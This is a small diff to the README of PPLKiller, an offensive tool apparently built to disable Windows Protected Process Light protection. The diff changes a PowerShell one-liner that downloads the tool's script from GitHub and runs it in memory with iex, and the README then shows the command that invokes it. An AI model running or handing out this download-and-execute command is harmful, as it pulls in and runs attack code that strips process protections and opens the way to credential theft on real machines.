@@ -27,7 +27,7 @@ PPLKiller.exe
 ## Run (Invoke-PPLKiller)
 
 ```
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/PPLKiller/main/Invoke-PPLKiller.ps1')
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/PPLKiller/refs/heads/main/Invoke-PPLKiller.ps1')
 ```
 ```
 Invoke-PPLKiller
